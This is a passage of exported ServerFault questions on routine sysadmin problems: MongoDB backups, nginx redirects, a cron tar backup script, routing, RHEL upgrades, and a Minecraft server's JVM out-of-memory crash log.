I may have forgotten something on the configuration, but there were no problem in the past time, server was nearly never listed.</p>
","<linux><email><postfix><dovecot>","2019-05-07 23:01:42"
"966411","How to ensure a consistent backup?","<p>I'm running MongoDB 4.0 with the WiredTiger storage engine under CentOS 7. The data files are held on a mounted XFS volume.</p>

<p>I can't use my hosting provider's backup service because it doesn't support XFS volumes. This means I need to take snapshots some other way and copy them over to a redundant file system that does have backups enabled.</p>

<p>I've read <a href=""https://docs.mongodb.com/master/tutorial/backup-with-filesystem-snapshots/#back-up-and-restore-using-lvm-on-linux"" rel=""nofollow noreferrer"">this article</a> which gives various options for taking the snapshots, but it doesn't go into detail about how to ensure a <a href=""https://docs.mongodb.com/master/tutorial/backup-with-filesystem-snapshots/#valid-database-at-the-time-of-snapshot"" rel=""nofollow noreferrer"">Valid Database at the Time of Snapshot</a>.</p>

<p>In addition to the LVM method described I've also looked at <code>xfsdump</code> and have even considered <code>rsync</code> (because the data comprises many small files). But regardless of the snapshot/copy method, how do I ensure that the backup is in a consistent state?</p>
","<centos><backup><centos7><mongodb><xfs>","2019-05-08 15:41:01"
"966473","Nginx redirect without a server name","<p>I'm serving a webpage from an embedded linux box that may or may not be connected to the internet. The idea is, a user enters the IP of the machine and the page comes up. I want to redirect all non-ssl urls to an ssl url (https). Every example I've found uses $server_name or $host in the <code>return</code> line of the nginx configuration. The problem for me is that the IP of the machine might change and editing the nginx config file every time is not an option. I've tried setting the server_name to <code>_</code> to no avail. What does work is if I set <code>server_name</code> to the current IP of the machine. Then, if I type in <code>192.168.1.196</code> it redirects to <code>https://192.168.1.196/dashboard</code>, which is what I want. Unfortunately this will not work in production, since as mentioned the IP may change. My current nginx config is below.</p>

<pre><code>server {
    listen       80;
    #server_name  _;
    #server_name 192.168.1.196;
    ssl_certificate server.crt;
    ssl_certificate_key private.pem;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers HIGH:!aNULL:!MD5;
    autoindex on;
    return 302 https://$server_name/dashboard;

    location /dashboard {
        alias build;
        index index.html;
    }
}
</code></pre>
","<nginx><ssl><web-server><https>","2019-05-08 23:33:02"
"1035072","Use Smartphone as gateway to internet for my local network (Not smartphone hotspot!)","<p>Am I able to use my Android smartphone with 4G LTE internet access as some kind of gateway to internet?</p>
<p>I need anyone who is connected to my local network made with Wi-fi router to be able to access internet.</p>
<p>My Android phone is also connected to this network by Wi-fi.</p>
<p>I do not mean Wi-fi HotSpot on phone or WDS. Those are useless to me.</p>
<p>My phone is rooted so I am able to make some routing there if nessesary.</p>
<p>Is it even possible?</p>
<p><a href=""https://i.sstatic.net/FQXUG.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/FQXUG.png"" alt=""enter image description here"" /></a></p>
","<router><wifi><gateway><android><access-point>","2020-09-23 17:11:59"
"966655","Same Interface routing with ICMP-Redirect disabled?","<p>I don't want to talk around the bush for long. I disagree with a friend how a router would behave in a special configuration. Unfortunately I can't test it here to check my point of view. Specifically, the router should <strong>not</strong> perform ICMP redirects.</p>

<p>I'm of the opinion that the router would still route on the same interface if its routing table requires it to, even if ICMP redirects are disabled.
My friend is of the opinion that the router with disabled ICMP redirects would not route on the same interface.</p>

<p>Does anyone know how the router would behave? Is there a RFC? Is this different from router to router? I am grateful for any assistance.</p>
","<routing><router><rfc>","2019-05-10 00:26:44"
"966677","Tar is not Finishing When Running as Cronjob","<p>My goal is to regularly pack the most important files on a server into a <code>tar.gz</code> file. In order to automate this I am using a cronjob to execute a script:</p>

<pre><code>$ crontab -l
# blablabla
* * * * * /home/backup/run_backup.sh &gt;&gt; /home/backup/output.txt 
</code></pre>

<p>For debugging reasons, I am currently running the job every minute.</p>

<p>As far as I can judge, it is not a cron problem, since the job executes every minute and runs as root (<code>whoami</code> in the script prints <code>root</code>).</p>

<p>The script that is running looks as follows:</p>

<pre><code>#!/bin/sh -l

echo ""Starting ...""

DATE=`date '+%Y-%m-%d_%H-%M-%S'`
BACKUP_PATH=""backups/$DATE.tar.gz""

# MAKE BACKUP OF ENTIRE DATABASE
echo ""Backing up database ...""
DATABASE_BACKUP_PATH=""/home/backup/mysql.sql""
docker exec central-mysql sh -c 'exec mysqldump --all-databases -uroot -p""xxx""' &gt; ""$DATABASE_BACKUP_PATH""

# MAKE ARCHIVE
echo ""Creating tar archive ...""
tar -vczf ""$BACKUP_PATH"" \
        /home/database/docker-compose.yml \
        /home/docker_res_usage.sh \
        /home/gitlab/docker-compose.yml \
        /home/gitlab/data/git-data/repositories \
        /home/mailserver/docker-compose.yml \
        /home/mailserver/mail/dkim \
        /home/mailserver/rainloop/_data_/_default_/configs/application.ini \
        /home/mailserver/rainloop/_data_/_default_/domains \
        /home/mailserver/readme.md \
        /home/php7-apache-alpine \
        /home/sftp \
        /home/traefik \
        /home/websites \
        ""$DATABASE_BACKUP_PATH""

# CLEAN-UP
echo ""Cleaning up ...""
rm ""$DATABASE_BACKUP_PATH""
</code></pre>

<p>The <code>docker</code> command runs without problem, creating a <code>.sql</code> file. <strong>However</strong>, the <code>tar</code> command starts to list the first few files, and then just stops somehow. <code>output.txt</code> looks like this:</p>

<pre><code>Cleaning up ...
Starting ...
Backing up database ...
Creating tar archive ...
/home/database/docker-compose.yml
/home/docker_res_usage.sh
/home/gitlab/docker-compose.yml
/home/gitlab/data/git-data/repositories/
/home/gitlab/data/git-data/repositories/websites/
/home/gitlab/data/git-data/repositories/websites/sbpp.git/
/home/gitlab/data/git-data/repositories/websites/sbpp.git/config
/home/gitlab/data/git-data/repositories/websites/sbpp.git/HEAD
/home/gitlab/data/git-data/repositories/websites/sbpp.git/hooks
/home/gitlab/data/git-data/repositories/websites/sbpp.git/info/
/home/gitlab/data/git-data/repositories/websites/sbpp.git/info/exclude
Cleaning up ...
</code></pre>

<p><strong>Question:</strong> Are there known reasons for tar to just stop compressing? Do you see errors in my script?</p>

<p>The strange thing about it is that <strong>when I run the script manually, it works</strong> just fine. Is it a cronjob thing after all? Do I have permission problems, even though I am running as root?</p>
","<debian><cron><tar>","2019-05-10 07:20:39"
"966836","Trying to upgrade RHEL 6.10 - yum errors - how to proceed","<p>I'm trying to upgrade a Redhat 6.10 box to 7. It's a web hosting box. I have been unable to update it in a while and so as expected, upgrading wouldn't be as easy as it should be.</p>

<p>I tried <code>yum upgrade</code> and received the following: <a href=""https://pastebin.com/ZcGLWdGg"" rel=""nofollow noreferrer"">https://pastebin.com/ZcGLWdGg</a></p>

<p>Is this a bad idea altogether or is it just a matter of trial and error and upgrading is just a long process given the situation?</p>
","<redhat><upgrade>","2019-05-11 14:04:03"
"841937","How to check if ISP has enough bandwidth for video streaming?","<p>I have 20Mbps ethernet connection. I connect through dhcp, I have static address on the LAN.
I know that 20Mbps should be enough to stream video from sites like youtube:
3 Mbps – Standard Definition video. 5-8 Mbps – 720p.</p>

<p>I have a problem streaming video at 720p - it hangs in buffering sometimes (at peak load times?). My question is how do I diagnose problem from my pc on the lan. Speedtest shows that I have 20Mbps. ISP specialists are not helpful and saying that everything is fine.</p>

<p>I have a lot of ""no reply"" in tracepath youtube.com. Sometimes it is showing 200ms ping for Europe-US packets.</p>
","<bandwidth><ethernet>","2017-04-01 10:14:27"
"967019","Can user credentials from HTTP session be seen through Wireshark?","<p>Can we get that info the same way we do for FTP since HTTP is a plain text protocol?</p>
","<networking><packet-capture><packet-sniffer><network-security>","2019-05-13 10:49:44"
"842088","how websites does detect TOR (and not let me in)","<p>I cannot enter some websites using the TOR or torify navigator</p>

<p>ex: <a href=""http://pagesjaunes.fr/"" rel=""nofollow noreferrer"">http://pagesjaunes.fr/</a></p>

<p>Is there a way to avoid that ?</p>
","<tor>","2017-04-02 17:58:19"
"1035495","Minecraft server constantly crashing","<p>I tried to make a VM instance on the Google cloud platform for my Minecraft server. But It's constantly crashing after a few hours. It says that I don't have enough memory but I think I allocated more then enough memory for a Minecraft server? I'm not very good at IT so I'm asking for your help please.</p>
<p>Last Error log:</p>
<pre><code>
 There is insufficient memory for the Java Runtime Environment to continue.

 Native memory allocation (mmap) failed to map 12288 bytes for committing reserved memory.

 Possible reasons:

   The system is out of physical RAM or swap space
   The process is running with CompressedOops enabled, and the Java Heap may be blocking the growth of the native heap
 Possible solutions:
   Reduce memory load on the system
   Increase physical memory or swap space
   Check if swap backing store is full
   Decrease Java heap size (-Xmx/-Xms)
   Decrease number of Java threads
   Decrease Java thread stack sizes (-Xss)
   Set larger code cache with -XX:ReservedCodeCacheSize=
   JVM is running with Zero Based Compressed Oops mode in which the Java heap is
     placed in the first 32GB address space. The Java Heap base address is the
     maximum limit for the native heap growth. Please use -XX:HeapBaseMinAddress
     to set the Java Heap base and to place the Java Heap above 32GB virtual address.
 This output file may be truncated or incomplete.

  Out of Memory Error (os_linux.cpp:2792), pid=13956, tid=0x00007f16405fa700

 JRE version: OpenJDK Runtime Environment (8.0_265-b01) (build 1.8.0_265-8u265-b01-0+deb9u1-b01)
 Java VM: OpenJDK 64-Bit Server VM (25.265-b01 mixed mode linux-amd64 compressed oops)
 Failed to write core dump. Core dumps have been disabled. To enable core dumping, try &quot;ulimit -c unlimited&quot; before starting Java again


---------------  T H R E A D  ---------------

Current thread (0x00007f1675129000):  JavaThread &quot;luckperms-scheduler-worker-189&quot; daemon [_thread_new, id=11393, stack(0x00007f16404fa000,0x00007f16405fb000)]

Stack: [0x00007f16404fa000,0x00007f16405fb000],  sp=0x00007f16405f9b50,  free space=1022k
Native frames: (J=compiled Java code, j=interpreted, Vv=VM code, C=native code)
V  [libjvm.so+0xa7dce0]
V  [libjvm.so+0x4cd62c]
V  [libjvm.so+0x8c715c]
V  [libjvm.so+0x8be55e]
V  [libjvm.so+0x8c86e7]
V  [libjvm.so+0xa1e658]
V  [libjvm.so+0xa2273c]
V  [libjvm.so+0x8c47e2]
C  [libpthread.so.0+0x74a4]  start_thread+0xc4


---------------  P R O C E S S  ---------------

Java Threads: ( =&gt; current thread )
=&gt;0x00007f1675129000 JavaThread &quot;luckperms-scheduler-worker-189&quot; daemon [_thread_new, id=11393, stack(0x00007f16404fa000,0x00007f16405fb000)]
  0x00007f16750f3800 JavaThread &quot;luckperms-scheduler-worker-188&quot; daemon [_thread_blocked, id=11386, stack(0x00007f16402f8000,0x00007f16403f9000)]
  0x00007f1675112800 JavaThread &quot;luckperms-scheduler-worker-187&quot; daemon [_thread_blocked, id=11277, stack(0x00007f162aaf7000,0x00007f162abf8000)]
  0x00007f165c04b000 JavaThread &quot;Netty Epoll Server IO #3&quot; daemon [_thread_in_native, id=14245, stack(0x00007f162b7fc000,0x00007f162b8fd000)]
  0x00007f165c049000 JavaThread &quot;Netty Epoll Server IO #2&quot; daemon [_thread_in_native, id=14219, stack(0x00007f1630a97000,0x00007f1630b98000)]
</code></pre>
<p>** Hundreds of lines repeating similar to this:&quot;0x00007f1648005800 JavaThread &quot;pool-16-thread-1&quot; [_thread_blocked, id=14087, stack(0x00007f162abf8000,0x00007f162acf9000)]&quot; Will post them separately if needed.**</p>
<pre><code>Other Threads:
  0x00007f168c0fb000 VMThread [stack: 0x00007f1678edf000,0x00007f1678fdf000] [id=13960]
  0x00007f168c143800 WatcherThread [stack: 0x00007f167863d000,0x00007f167873d000] [id=13967]

VM state:not at safepoint (normal execution)

VM Mutex/Monitor currently owned by a thread: None

heap address: 0x0000000674c00000, size: 5300 MB, Compressed Oops mode: Zero based, Oop shift amount: 3
Narrow klass base: 0x0000000000000000, Narrow klass shift: 3
Compressed class space size: 1073741824 Address: 0x00000007c0000000

Heap:
 PSYoungGen      total 1730560K, used 114047K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 2% used [0x0000000751980000,0x0000000753d07e30,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2d8000,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3570743K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074eb0dcb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K

Card table byte_map: [0x00007f167b572000,0x00007f167bfcd000] byte_map_base: 0x00007f16781cc000

Marking Bits: (ParMarkBitMap*) 0x00007f1691d5b720
 Begin Bits: [0x00007f1661a60000, 0x00007f1666d30000)
 End Bits:   [0x00007f1666d30000, 0x00007f166c000000)

Polling page: 0x00007f1692b83000

CodeCache: size=245760Kb used=88580Kb max_used=88596Kb free=157179Kb
 bounds [0x00007f167c38d000, 0x00007f1681abd000, 0x00007f168b38d000]
 total_blobs=26739 nmethods=25596 adapters=1048
 compilation: enabled

Compilation events (10 events):
Event: 31834.721 Thread 0x00007f168c13e000 43872       3       java.net.SocketAddress::&lt;init&gt; (5 bytes)
Event: 31834.748 Thread 0x00007f168c13e000 nmethod 43872 0x00007f167cb762d0 code [0x00007f167cb76440, 0x00007f167cb765f0]
Event: 31834.763 Thread 0x00007f168c13e000 43873       3       java.io.PrintStream::&lt;init&gt; (19 bytes)
Event: 31834.764 Thread 0x00007f168c13e000 nmethod 43873 0x00007f167e6e6d10 code [0x00007f167e6e6f20, 0x00007f167e6e7698]
Event: 31834.764 Thread 0x00007f168c13e000 43874   !   3       java.io.PrintStream::toCharset (22 bytes)
Event: 31834.765 Thread 0x00007f168c13e000 nmethod 43874 0x00007f167f423dd0 code [0x00007f167f423fa0, 0x00007f167f4244d8]
Event: 31834.765 Thread 0x00007f168c13e000 43875       3       java.io.PrintStream::&lt;init&gt; (49 bytes)
Event: 31834.767 Thread 0x00007f168c13e000 nmethod 43875 0x00007f1681ab4810 code [0x00007f1681ab4a40, 0x00007f1681ab55a8]
Event: 32134.765 Thread 0x00007f168c13e000 43876       1       org.bukkit.craftbukkit.v1_16_R2.entity.CraftMinecartChest::getType (4 bytes)
Event: 32134.790 Thread 0x00007f168c13e000 nmethod 43876 0x00007f167eef9250 code [0x00007f167eef93a0, 0x00007f167eef94b0]

GC Heap History (10 events):
Event: 31696.080 GC heap before
{Heap before GC invocations=561 (full 4):
 PSYoungGen      total 1730560K, used 1729856K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 100% used [0x0000000751980000,0x00000007b6700000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007bb380000,0x00000007bff50000,0x00000007c0000000)
  to   space 78336K, 0% used [0x00000007b6700000,0x00000007b6700000,0x00000007bb380000)
 ParOldGen       total 3618304K, used 3544911K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 97% used [0x0000000674c00000,0x000000074d1d3cb0,0x0000000751980000)
 Metaspace       used 120759K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
Event: 31696.243 GC heap after
Heap after GC invocations=561 (full 4):
 PSYoungGen      total 1730560K, used 77568K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 0% used [0x0000000751980000,0x0000000751980000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2c0000,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3550127K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074d6ebcb0,0x0000000751980000)
 Metaspace       used 120759K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
}
Event: 31812.264 GC heap before
{Heap before GC invocations=562 (full 4):
 PSYoungGen      total 1730560K, used 1729792K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 100% used [0x0000000751980000,0x00000007b6700000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2c0000,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3550127K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074d6ebcb0,0x0000000751980000)
 Metaspace       used 120759K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
Event: 31812.434 GC heap after
Heap after GC invocations=562 (full 4):
 PSYoungGen      total 1730560K, used 77568K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 0% used [0x0000000751980000,0x0000000751980000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007bb380000,0x00000007bff40000,0x00000007c0000000)
  to   space 78336K, 0% used [0x00000007b6700000,0x00000007b6700000,0x00000007bb380000)
 ParOldGen       total 3618304K, used 3555295K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074dbf7cb0,0x0000000751980000)
 Metaspace       used 120759K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
}
Event: 31924.821 GC heap before
{Heap before GC invocations=563 (full 4):
 PSYoungGen      total 1730560K, used 1729792K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 100% used [0x0000000751980000,0x00000007b6700000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007bb380000,0x00000007bff40000,0x00000007c0000000)
  to   space 78336K, 0% used [0x00000007b6700000,0x00000007b6700000,0x00000007bb380000)
 ParOldGen       total 3618304K, used 3555295K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074dbf7cb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
Event: 31924.991 GC heap after
Heap after GC invocations=563 (full 4):
 PSYoungGen      total 1730560K, used 77696K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 0% used [0x0000000751980000,0x0000000751980000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2e0240,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3560415K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074e0f7cb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
}
Event: 32041.334 GC heap before
{Heap before GC invocations=564 (full 4):
 PSYoungGen      total 1730560K, used 1729920K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 100% used [0x0000000751980000,0x00000007b6700000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2e0240,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3560415K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074e0f7cb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
Event: 32041.508 GC heap after
Heap after GC invocations=564 (full 4):
 PSYoungGen      total 1730560K, used 77632K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 0% used [0x0000000751980000,0x0000000751980000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007bb380000,0x00000007bff50000,0x00000007c0000000)
  to   space 78336K, 0% used [0x00000007b6700000,0x00000007b6700000,0x00000007bb380000)
 ParOldGen       total 3618304K, used 3565551K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074e5fbcb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
}
Event: 32155.312 GC heap before
{Heap before GC invocations=565 (full 4):
 PSYoungGen      total 1730560K, used 1729856K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 100% used [0x0000000751980000,0x00000007b6700000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007bb380000,0x00000007bff50000,0x00000007c0000000)
  to   space 78336K, 0% used [0x00000007b6700000,0x00000007b6700000,0x00000007bb380000)
 ParOldGen       total 3618304K, used 3565551K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074e5fbcb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
Event: 32155.507 GC heap after
Heap after GC invocations=565 (full 4):
 PSYoungGen      total 1730560K, used 77664K [0x0000000751980000, 0x00000007c0000000, 0x00000007c0000000)
  eden space 1652224K, 0% used [0x0000000751980000,0x0000000751980000,0x00000007b6700000)
  from space 78336K, 99% used [0x00000007b6700000,0x00000007bb2d8000,0x00000007bb380000)
  to   space 78336K, 0% used [0x00000007bb380000,0x00000007bb380000,0x00000007c0000000)
 ParOldGen       total 3618304K, used 3570743K [0x0000000674c00000, 0x0000000751980000, 0x0000000751980000)
  object space 3618304K, 98% used [0x0000000674c00000,0x000000074eb0dcb0,0x0000000751980000)
 Metaspace       used 120760K, capacity 137598K, committed 137804K, reserved 1167360K
  class space    used 16786K, capacity 20269K, committed 20352K, reserved 1048576K
}

Deoptimization events (10 events):
Event: 20740.958 Thread 0x00007f168ce52800 Uncommon trap: reason=bimorphic action=maybe_recompile pc=0x00007f1680ade2e4 method=net.minecraft.server.v1_16_R2.CriterionConditionEntity$b.a(Lnet/minecraft/server/v1_16_R2/LootTableInfo;)Z @ 5
Event: 20740.965 Thread 0x00007f168ce52800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f1680a6fa84 method=net.minecraft.server.v1_16_R2.EntityWolf.tick()V @ 23
Event: 20741.807 Thread 0x00007f168ce52800 Uncommon trap: reason=bimorphic action=maybe_recompile pc=0x00007f1680ade2e4 method=net.minecraft.server.v1_16_R2.CriterionConditionEntity$b.a(Lnet/minecraft/server/v1_16_R2/LootTableInfo;)Z @ 5
Event: 20882.721 Thread 0x00007f168ce52800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f1681697afc method=net.minecraft.server.v1_16_R2.AxisAlignedBB.e(DDD)Z @ 24
Event: 20882.721 Thread 0x00007f168ce52800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f16816e6614 method=net.minecraft.server.v1_16_R2.AxisAlignedBB.e(DDD)Z @ 24
Event: 20909.826 Thread 0x00007f168ce52800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f16803be3dc method=com.sekwah.advancedportals.bukkit.listeners.Listeners.onDamEvent(Lorg/bukkit/event/entity/EntityDamageEvent;)V @ 37
Event: 20964.782 Thread 0x00007f168ce52800 Uncommon trap: reason=class_check action=maybe_recompile pc=0x00007f16803c48a4 method=net.minecraft.server.v1_16_R2.EntityMinecartAbstract.collide(Lnet/minecraft/server/v1_16_R2/Entity;)V @ 40
Event: 21000.110 Thread 0x00007f168d837800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f167f424360 method=java.util.concurrent.ConcurrentLinkedQueue.offer(Ljava/lang/Object;)Z @ 72
Event: 23333.914 Thread 0x00007f168ce52800 Uncommon trap: reason=unstable_if action=reinterpret pc=0x00007f167fe5083c method=net.minecraft.server.v1_16_R2.EntityVillagerTrader.eY()V @ 25
Event: 23434.717 Thread 0x00007f168ce52800 Uncommon trap: reason=bimorphic action=maybe_recompile pc=0x00007f167e1bc700 method=java.util.HashMap$ValueSpliterator.forEachRemaining(Ljava/util/function/Consumer;)V @ 145

Classes redefined (0 events):
No events

Internal exceptions (10 events):
Event: 32135.671 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e70128) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.673 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e759d0) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.676 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e84ff8) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.678 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e8b950) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.680 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e922f8) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.717 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e97978) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.719 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5e9d2d0) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.721 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5ea2fc0) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.768 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5ea9008) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]
Event: 32135.770 Thread 0x000055c95f3c5000 Exception &lt;a 'sun/nio/fs/UnixException'&gt; (0x00000007a5eaeae8) thrown at [/build/openjdk-8-lU31QX/openjdk-8-8u265-b01/src/hotspot/src/share/vm/prims/jni.cpp, line 711]

Events (10 events):
Event: 32041.325 Executing VM operation: ParallelGCFailedAllocation
Event: 32041.510 Executing VM operation: ParallelGCFailedAllocation done
Event: 32041.516 Thread 0x00007f1675112800 Thread added: 0x00007f1675112800
Event: 32101.525 Executing VM operation: RevokeBias
Event: 32101.534 Executing VM operation: RevokeBias done
Event: 32101.534 Thread 0x00007f16750f3800 Thread exited: 0x00007f16750f3800
Event: 32146.505 Thread 0x00007f16750f3800 Thread added: 0x00007f16750f3800
Event: 32155.306 Executing VM operation: ParallelGCFailedAllocation
Event: 32155.514 Executing VM operation: ParallelGCFailedAllocation done
Event: 32155.521 Thread 0x00007f1675129000 Thread added: 0x00007f1675129000


Dynamic libraries:
674c00000-7c13e0000 rw-p 00000000 00:00 0 
7c13e0000-800000000 ---p 00000000 00:00 0 
55c95c030000-55c95c031000 r-xp 00000000 08:01 662460                     /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
55c95c230000-55c95c231000 r--p 00000000 08:01 662460                     /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
55c95c231000-55c95c232000 rw-p 00001000 08:01 662460                     /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
55c95e09a000-55c95f48c000 rw-p 00000000 00:00 0                          [heap]
7f1624000000-7f16265d7000 rw-p 00000000 00:00 0 
</code></pre>
<p>**Thousands lines of 7f162981e000-7f16298de000 rw-p 00000000 00:00 0 **
(I had to delete them because It couldn't fit here I will post them separately if they are important.)</p>
<pre><code>
7f169295d000-7f1692961000 rw-p 00000000 00:00 0 
7f1692961000-7f1692984000 r-xp 00000000 08:01 524356                     /lib/x86_64-linux-gnu/ld-2.24.so
7f1692984000-7f1692985000 r--s 00001000 08:01 655423                     /home/minecraft/BOBVALIKJEDE/datapacks/2.zip
7f1692985000-7f1692988000 r--s 0000f000 08:01 662522                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/icedtea-sound.jar
7f1692988000-7f169298a000 r--s 00001000 08:01 662521                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/dnsns.jar
7f169298a000-7f169298b000 r--s 00010000 08:01 662529                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/zipfs.jar
7f169298b000-7f169298c000 r--s 0000a000 08:01 662523                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/jaccess.jar
7f169298c000-7f1692992000 r--s 0003d000 08:01 662527                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunjce_provider.jar
7f1692992000-7f16929ad000 r--s 00394000 08:01 662520                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/cldrdata.jar
7f16929ad000-7f1692a08000 rw-p 00000000 00:00 0 
7f1692a08000-7f1692a70000 rw-p 00000000 00:00 0 
